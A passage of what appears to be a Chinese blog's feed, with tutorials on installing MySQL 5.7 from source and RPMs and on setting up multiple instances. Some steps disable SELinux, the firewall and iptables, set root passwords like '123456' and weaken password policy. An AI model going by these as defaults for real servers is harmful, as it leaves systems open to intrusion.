----&#x5237;&#x65B0;&#x6743;&#x9650;&#xFF0C;&#x7ACB;&#x5373;&#x751F;&#x6548;mysql&gt; quit</code></pre><p>rpm&#x5B89;&#x88C5;MySQL5.7&#x914D;&#x7F6E;&#x591A;&#x5B9E;&#x4F8B;<br>&#x94FE;&#x63A5;&#xFF1A;<a href="https://note.youdao.com/s/LGwmlumI" target="_blank" rel="noopener">https://note.youdao.com/s/LGwmlumI</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;#x4F7F;&amp;#x7528;rpm&amp;#x5305;&amp;#x5B89;&amp;#x88C5;MySQL5.7&amp;#x6570;&amp;#x636E;&amp;#x5E93;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;#x4F18;&amp;#x5316;Linux&amp;#x7CFB;&amp;#x7EDF;  &lt;/li&gt;
&lt;/o
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL5.7</title>
    <link href="https://marnm.github.io//posts/61fb6d52/"/>
    <id>https://marnm.github.io//posts/61fb6d52/</id>
    <published>2022-06-07T04:43:47.000Z</published>
    <updated>2022-06-07T05:15:11.175Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL-5-7"><a href="#&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL-5-7" class="headerlink" title="&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.7"></a>&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.7</h2><h3 id="1-&#x5B89;&#x88C5;&#x4F9D;&#x8D56;-Boost-C-&#x5E93;"><a href="#1-&#x5B89;&#x88C5;&#x4F9D;&#x8D56;-Boost-C-&#x5E93;" class="headerlink" title="1. &#x5B89;&#x88C5;&#x4F9D;&#x8D56; Boost C++ &#x5E93;"></a>1. &#x5B89;&#x88C5;&#x4F9D;&#x8D56; Boost C++ &#x5E93;</h3><p>&#x4ECE;MySQL5.7&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;&#x5B89;&#x88C5;MySQL&#x9700;&#x8981;&#x4F9D;&#x8D56; Boost &#x7684;C++&#x6269;&#x5C55;&#xFF0C;&#x800C;&#x4E14;&#x53EA;&#x80FD;&#x662F; 1.59.0 &#x7248;&#x672C;&#x3002;<br>Boost &#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF08;&#x4EFB;&#x4E00;&#x5730;&#x5740;&#x90FD;&#x53EF;&#x4E0B;&#x8F7D;&#xFF09;&#xFF1A;<br><a href="http://www.boost.org/users/history" target="_blank" rel="noopener">http://www.boost.org/users/history</a> &#xFF1B;<br><a href="https://www.boost.org/users/history/version_1_59_0.html" target="_blank" rel="noopener">https://www.boost.org/users/history/version_1_59_0.html</a><br><a href="https://sourceforge.net/projects/boost/files/boost/1.59.0/" target="_blank" rel="noopener">https://sourceforge.net/projects/boost/files/boost/1.59.0/</a><br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-boost-5.7.19.tar.gz" target="_blank" rel="noopener">https://downloads.mysql.com/archives/get/p/23/file/mysql-boost-5.7.19.tar.gz</a><br>&#x9009;&#x62E9;1.59.0&#x7248;&#x672C;&#x4E0B;&#x8F7D;&#xFF0C;&#x5728;&#x7F16;&#x8BD1;&#x662F;&#x586B;&#x5199;&#x76F8;&#x5E94;&#x53C2;&#x6570;&#xFF0C;&#x6307;&#x5B9A;Boost&#x6E90;&#x7801;&#x4F4D;&#x7F6E;&#x5373;&#x53EF;&#x3002;<br>Boost&#x5E93;&#x662F;&#x4E00;&#x4E2A;&#x53EF;&#x79FB;&#x690D;&#x3001;&#x63D0;&#x4F9B;&#x6E90;&#x4EE3;&#x7801;&#x7684;C++&#x5E93;&#xFF0C;&#x4F5C;&#x4E3A;&#x6807;&#x51C6;&#x5E93;&#x7684;&#x540E;&#x5907;&#xFF0C;&#x662F;C++&#x6807;&#x51C6;&#x5316;&#x8FDB;&#x7A0B;&#x7684;&#x5F00;&#x53D1;&#x5F15;&#x64CE;&#x4E4B;&#x4E00;&#x3002;<br>Boost&#x5E93;&#x7531;C++&#x6807;&#x51C6;&#x59D4;&#x5458;&#x4F1A;&#x5E93;&#x5DE5;&#x4F5C;&#x7EC4;&#x6210;&#x5458;&#x53D1;&#x8D77;&#xFF0C;&#x5176;&#x4E2D;&#x6709;&#x4E9B;&#x5185;&#x5BB9;&#x6709;&#x671B;&#x6210;&#x4E3A;&#x4E0B;&#x4E00;&#x4EE3;C++&#x6807;&#x51C6;&#x5E93;&#x5185;&#x5BB9;&#x3002;<br>&#x5728;C++&#x793E;&#x533A;&#x4E2D;&#x5F71;&#x54CD;&#x751A;&#x5927;&#xFF0C;&#x662F;&#x4E0D;&#x6298;&#x4E0D;&#x6263;&#x7684;&#x201C;&#x51C6;&#x201D;&#x6807;&#x51C6;&#x5E93;&#x3002;Boost&#x7531;&#x4E8E;&#x5176;&#x5BF9;&#x8DE8;&#x5E73;&#x53F0;&#x7684;&#x5F3A;&#x8C03;&#xFF0C;&#x5BF9;&#x6807;&#x51C6;C++&#x7684;&#x5F3A;&#x8C03;&#xFF0C;&#x4E0E;&#x7F16;&#x5199;&#x5E73;&#x53F0;&#x65E0;&#x5173;&#x3002;  </p><p><strong>&#x4E0B;&#x8F7D;&#x89E3;&#x538B;Boost C++&#x5E93;</strong>  </p><pre><code>wget http://sourceforge.net/projects/boost/files/boost/1.59.0/boost_1_59_0.tar.gz# &#x89E3;&#x538B;&#x5230;/usr/local/boosttar -zxvf boost_1_59_0.tar.gz mv boost_1_59_0 /usr/local/boost</code></pre><h3 id="2-&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;"><a href="#2-&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;" class="headerlink" title="2. &#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;"></a>2. &#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;</h3><pre><code>yum install -y gcc-c++ cmake ncurses-devel</code></pre><h3 id="3-&#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;"><a href="#3-&#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;" class="headerlink" title="3. &#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;"></a>3. &#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;</h3><pre><code>groupadd -g 27 mysqluseradd mysql -u 27 -g mysql -M -s /sbin/nologin</code></pre><h3 id="4-&#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;"><a href="#4-&#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;" class="headerlink" title="4. &#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;"></a>4. &#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;</h3><pre><code>mkdir -p /data/mysqlchown -Rf mysql:mysql /data/mysql</code></pre><h3 id="5-&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL-5-7"><a href="#5-&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL-5-7" class="headerlink" title="5. &#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL 5.7"></a>5. &#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL 5.7</h3><p>MySQL&#x5B98;&#x65B9;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<br><a href="https://downloads.mysql.com/archives/community/" target="_blank" rel="noopener">https://downloads.mysql.com/archives/community/</a></p><p><strong>&#x4E0B;&#x8F7D;</strong></p><pre><code>wget https://downloads.mysql.com/archives/get/p/23/file/mysql-5.7.19.tar.gztar -zxvf mysql-5.7.19.tar.gz -C /usr/local/src</code></pre><p><strong>&#x7F16;&#x8BD1;&#x5B89;&#x88C5;</strong></p><pre><code>cd /usr/local/src/mysql-5.7.19# &#x9884;&#x7F16;&#x8BD1;cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql57 -DMYSQL_DATADIR=/data/mysql -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DMYSQL_TCP_PORT=3306 -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DMYSQL_USER=mysql -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/usr/local/boost -DWITH_INNODB_MEMCACHED=ON## &#x7F16;&#x8BD1;&#x5B89;&#x88C5;# &#x9ED8;&#x8BA4;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x975E;&#x5E38;&#x6162;&#xFF0C;&#x4E0D;&#x63A8;&#x8350;# &#x52A0;&#x901F;&#x7F16;&#x8BD1;&#x65B9;&#x6CD5;&#x770B;&#x6587;&#x672B;&#x64CD;&#x4F5C;make &amp;&amp; make install</code></pre><h3 id="6-&#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;"><a href="#6-&#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;" class="headerlink" title="6. &#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;"></a>6. &#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</h3><pre><code>mv /etc/my.cnf /etc/my.cnf.bak</code></pre><pre><code class="bash">cat &gt; /etc/my.cnf &lt;&lt;EOF[client]port=3306socket=/data/mysql/mysql.sock[mysqld]character-set-server=utf8collation-server=utf8_general_ciskip-name-resolveuser=mysqlport=3306basedir=/usr/local/mysql57datadir=/data/mysqltmpdir=/tmpsocket=/data/mysql/mysql.socklog-error=/data/mysql/mysqld.logpid-file=/data/mysql/mysqld.pidEOF</code></pre><h3 id="7-&#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;"><a href="#7-&#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;" class="headerlink" title="7. &#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;"></a>7. &#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;</h3><pre><code class="bash">echo &quot;export PATH=\$PATH:/usr/local/mysql57/bin&quot; &gt;&gt; /etc/profilesource /etc/profile</code></pre><h3 id="8-&#x521D;&#x59CB;&#x5316;MySQL-5-7"><a href="#8-&#x521D;&#x59CB;&#x5316;MySQL-5-7" class="headerlink" title="8. &#x521D;&#x59CB;&#x5316;MySQL 5.7"></a>8. &#x521D;&#x59CB;&#x5316;MySQL 5.7</h3><pre><code>/usr/local/mysql57/bin/mysqld --defaults-file=/etc/my.cnf --initialize --user=mysql</code></pre><h3 id="9-&#x8FD0;&#x884C;MySQL"><a href="#9-&#x8FD0;&#x884C;MySQL" class="headerlink" title="9. &#x8FD0;&#x884C;MySQL"></a>9. &#x8FD0;&#x884C;MySQL</h3><pre><code>/usr/local/mysql57/support-files/mysql.server start/usr/local/mysql57/support-files/mysql.server status</code></pre><h3 id="10-&#x67E5;&#x627E;MySQL-root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;"><a href="#10-&#x67E5;&#x627E;MySQL-root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;" class="headerlink" title="10. &#x67E5;&#x627E;MySQL root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;"></a>10. &#x67E5;&#x627E;MySQL root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;</h3><pre><code>cd /data/mysqlcat mysqld.log | grep root</code></pre><h3 id="11-&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;"><a href="#11-&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;" class="headerlink" title="11. &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;"></a>11. &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</h3><p><strong>&#x4F7F;&#x7528;root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;MySQL</strong></p><pre><code class="sql">ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;New_password&apos;;FLUSH PRIVILEGES;</code></pre><h3 id="12-&#x521B;&#x5EFA;MySQL-5-7-systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;"><a href="#12-&#x521B;&#x5EFA;MySQL-5-7-systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;" class="headerlink" title="12. &#x521B;&#x5EFA;MySQL 5.7 systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;"></a>12. &#x521B;&#x5EFA;MySQL 5.7 systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;</h3><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://dev.mysql.com/doc/refman/5.7/en/using-systemd.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/using-systemd.html</a></p><h3 id="13-&#x7F16;&#x8BD1;&#x4F18;&#x5316;"><a href="#13-&#x7F16;&#x8BD1;&#x4F18;&#x5316;" class="headerlink" title="13. &#x7F16;&#x8BD1;&#x4F18;&#x5316;"></a>13. &#x7F16;&#x8BD1;&#x4F18;&#x5316;</h3><p><strong>&#x5B89;&#x88C5;ccache&#x52A0;&#x5FEB;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;</strong></p><pre><code>yum install -y epel-releaseyum install -y ccache# &#x4F7F;&#x7528;ccache&#x63A5;&#x7BA1;gcc/g++cp ccache /usr/local/bin/ln -s ccache /usr/local/bin/gccln -s ccache /usr/local/bin/g++ln -s ccache /usr/local/bin/ccln -s ccache /usr/local/bin/c++</code></pre><p><strong>make -j&#x5E76;&#x884C;&#x7F16;&#x8BD1;</strong><br>CPU&#x662F;&#x5F71;&#x54CD;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x56E0;&#x7D20;<br><code>make -j4</code> &#x8BA9;make&#x6700;&#x591A;&#x5141;&#x8BB8;4&#x4E2A;&#x7F16;&#x8BD1;&#x547D;&#x4EE4;&#x540C;&#x65F6;&#x6267;&#x884C;</p><p>&#x5728;&#x591A;&#x6838;CPU&#x4E0A;&#xFF0C;&#x9002;&#x5F53;&#x7684;&#x8FDB;&#x884C;&#x5E76;&#x884C;&#x7F16;&#x8BD1;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x660E;&#x663E;&#x63D0;&#x9AD8;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x7684;&#x3002;&#x4F46;&#x5E76;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x4E0D;&#x5B9C;&#x592A;&#x591A;&#xFF0C;<strong>make -j &#x4E00;&#x822C;&#x662F;&#x4EE5;CPU&#x7684;&#x6838;&#x5FC3;&#x6570;&#x76EE;&#x7684;&#x4E24;&#x500D;</strong>&#x4E3A;&#x5B9C;&#x3002;</p><p><strong>&#x6CE8;&#x610F;&#xFF01;</strong> &#x5728;&#x4F7F;&#x7528;&#x5E76;&#x884C;&#x7F16;&#x8BD1;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x548C;&#x4EA4;&#x6362;&#x5206;&#x533A;&#x7ED9;&#x5927;&#x4E00;&#x4E9B;&#xFF0C;&#x5185;&#x5B58;&#x8FC7;&#x5C0F;&#x65F6;&#xFF0C;&#x7F16;&#x8BD1;&#x4F1A;&#x51FA;&#x9519;</p><p>ccache&#x5B98;&#x65B9;&#x6587;&#x6863;<br><a href="https://ccache.dev/manual/4.3.html" target="_blank" rel="noopener">https://ccache.dev/manual/4.3.html</a></p><hr><hr><h2 id="&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL-5-7"><a href="#&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL-5-7" class="headerlink" title="&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL 5.7"></a>&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL 5.7</h2><h3 id="1-&#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;"><a href="#1-&#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;" class="headerlink" title="1. &#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;"></a>1. &#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;</h3><pre><code>sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null</code></pre><h3 id="2-&#x83B7;&#x53D6;MySQL-5-7&#x7684;rpm&#x5305;"><a href="#2-&#x83B7;&#x53D6;MySQL-5-7&#x7684;rpm&#x5305;" class="headerlink" title="2. &#x83B7;&#x53D6;MySQL 5.7&#x7684;rpm&#x5305;"></a>2. &#x83B7;&#x53D6;MySQL 5.7&#x7684;rpm&#x5305;</h3><p>&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x4E00;&#xFF1A;<br>MySQL&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;<br><a href="https://downloads.mysql.com/archives/community/" target="_blank" rel="noopener">https://downloads.mysql.com/archives/community/</a><br>&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x4E8C;&#xFF1A;copy&#x955C;&#x50CF;&#x5B89;&#x88C5;&#x5305;   </p><p><strong>&#x5206;&#x522B;&#x4E0B;&#x8F7D;&#x8FD9;5&#x4E2A;rpm&#x5305;&#xFF1A;</strong><br>MySQL&#x670D;&#x52A1;&#x7AEF;&#x7A0B;&#x5E8F;RPM Package, MySQL Server&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-server-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-server-5.7.24-1.el7.x86_64.rpm</a><br>MySQL&#x5BA2;&#x6237;&#x7AEF;&#x5DE5;&#x5177;RPM Package, Client Utilities&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-client-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-client-5.7.24-1.el7.x86_64.rpm</a><br>MySQL&#x5F00;&#x53D1;&#x5E93;RPM Package, Development Libraries&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-devel-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-devel-5.7.24-1.el7.x86_64.rpm</a><br>MySQL&#x914D;&#x7F6E;&#x7A0B;&#x5E8F;RPM Package, MySQL Configuration&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-common-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-common-5.7.24-1.el7.x86_64.rpm</a><br>MySQL&#x5171;&#x4EAB;&#x5E93;RPM Package, Shared Libraries&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-libs-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-libs-5.7.24-1.el7.x86_64.rpm</a>  </p><h3 id="3-&#x5B89;&#x88C5;MySQL"><a href="#3-&#x5B89;&#x88C5;MySQL" class="headerlink" title="3. &#x5B89;&#x88C5;MySQL"></a>3. &#x5B89;&#x88C5;MySQL</h3><p><strong>&#x5378;&#x8F7D;&#x7CFB;&#x7EDF;&#x4E2D;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;mariadb-libs&#x6570;&#x636E;&#x5E93;&#x5305;</strong></p><pre><code>rpm -e --nodeps mariadb-libs</code></pre><p><strong>&#x5B89;&#x88C5;rpm&#x5305;</strong><br>&#x5B89;&#x88C5;&#x987A;&#x5E8F;&#xFF1A;</p><pre><code>rpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm</code></pre><h3 id="4-&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;"><a href="#4-&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="4. &#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;"></a>4. &#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;</h3><pre><code>vim /etc/my.cnf# &#x672B;&#x884C;&#x6DFB;&#x52A0;skip-name-resolv&#xFF0C;&#x8DF3;&#x8FC7;&#x4E3B;&#x673A;&#x540D;&#x89E3;&#x6790;&#xFF0C;&#x63D0;&#x9AD8;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;skip-name-resolv</code></pre><p><strong>&#x542F;&#x52A8;&#x6570;&#x636E;&#x5E93;</strong></p><pre><code>systemctl start mysqldsystemctl status mysqldsystemctl enable mysqld</code></pre><h3 id="5-&#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;"><a href="#5-&#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;" class="headerlink" title="5. &#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;"></a>5. &#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;</h3><pre><code>cat /var/log/mysqld.log | grep &quot;password&quot;</code></pre><h3 id="6-&#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;"><a href="#6-&#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;" class="headerlink" title="6. &#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;"></a>6. &#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;</h3><p><strong>&#x4F7F;&#x7528;MySQL root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;</strong></p><pre><code class="sql">ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;new_PASSWORD&apos;;FLUSH PRIVILEGES;# &#x6216;&#x8005;update mysql.user set authentication_string=password(&apos;123456&apos;) where user=&apos;root&apos; and Host = &apos;localhost&apos;;# &#x6216;&#x8005;set password for &apos;root&apos;@&apos;localhost&apos;=password(&apos;123456&apos;);</code></pre><h4 id="&#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;"><a href="#&#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;" class="headerlink" title="&#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;"></a>&#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;</h4><p>&#x5728;&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL 5.7&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x7B56;&#x7565;&#x662F;MEDIUM&#xFF0C;&#x4F7F;&#x7528;&#x521D;&#x59CB;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x5FC5;&#x987B;&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#xFF0C;&#x4E0D;&#x7136;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x90FD;&#x4E0D;&#x80FD;&#x7528;&#xFF0C;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x540E;&#x624D;&#x80FD;&#x6B63;&#x5E38;&#x64CD;&#x4F5C;&#x3002;<br><strong>&#x65B9;&#x6CD5;&#x4E00;&#xFF1A;&#x5173;&#x95ED;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;&#x63D2;&#x4EF6;</strong><br>&#x4FEE;&#x6539;MySQL&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570;</p><pre><code>validate_password=off</code></pre><p><strong>&#x65B9;&#x6CD5;&#x4E8C;&#xFF1A;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x7B56;&#x7565;</strong>&#xFF08;&#x63A8;&#x8350;&#xFF09;</p><pre><code class="sql">-- &#x67E5;&#x770B;&#x5BC6;&#x7801;&#x7B56;&#x7565;SHOW VARIABLES like &quot;%password%&quot;;SET global validate_password_length=6;SET global validate_password_policy=0;# 0 &#x6216; LOW# 1 &#x6216; MEDIUM# 2 &#x6216; STRONGFLUSH PRIVILEGES;</code></pre><h3 id="MySQL-5-7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;"><a href="#MySQL-5-7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;" class="headerlink" title="MySQL 5.7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;"></a>MySQL 5.7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;</h3><p><strong>&#x5B89;&#x88C5;MySQL 5.7 rpm&#x5305;</strong></p><pre><code>rpm -e --nodeps mariadb-libsrpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm</code></pre><p><strong>&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5B58;&#x653E;&#x76EE;&#x5F55;</strong></p><pre><code>mkdir -p /data/mysql/{3306, 3307}mkdir -p /data/mysql/3306/{data, binlog, logs}mkdir -p /data/mysql/3307/{data, binlog, logs}</code></pre><p><strong>&#x521B;&#x5EFA;&#x7528;&#x6237;&#xFF0C;&#x8BBE;&#x7F6E;&#x5C5E;&#x4E3B;&#x5C5E;&#x7EC4;</strong></p><pre><code>chown -Rf mysql:mysql /data/mysqlmv /etc/my.cnf /etc/my.cnf.bak</code></pre><p><strong>&#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3306.cnf</strong></p><pre><code class="json">cat&gt;&gt;/etc/my3306.cnf&lt;&lt;EOF[mysqld]user = mysqlport = 3306server_id = 3306datadir = /data/mysql/3306/datasocket = /data/mysql/3306/mysql3306.socksymbolic-links = 0log-error = /data/mysql/3306/logs/mysqld3306.logpid-file = /data/mysql/3306/mysqld3306.pidEOF</code></pre><p><strong>&#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3307.cnf</strong></p><pre><code class="json">cp /etc/my3306.cnf /etc/my3307.cnfsed -i &apos;s/3306/3307/g&apos; /etc/my3307.cnf[root@jaking mysql5.7]# cat /etc/my3307.cnf[mysqld]user = mysqlport = 3307server_id = 3307datadir = /data/mysql/3307/datasocket = /data/mysql/3307/mysql3307.socksymbolic-links = 0log-error = /data/mysql/3307/logs/mysqld3307.logpid-file = /data/mysql/3307/mysqld3307.pid</code></pre><p><strong>&#x5907;&#x4EFD;mysql&#x542F;&#x52A8;&#x670D;&#x52A1;&#x6587;&#x4EF6;</strong></p><pre><code>mv /usr/lib/systemd/system/mysqld.service /usr/lib/systemd/system/mysqld.service.bak</code></pre><p><strong>&#x65B0;&#x589E;mysqld3306.service&#x542F;&#x52A8;&#x6587;&#x4EF6;</strong></p><pre><code class="json">cat&gt;&gt;/usr/lib/systemd/system/mysqld3306.service&lt;&lt;EOF[Unit]Description=MySQL 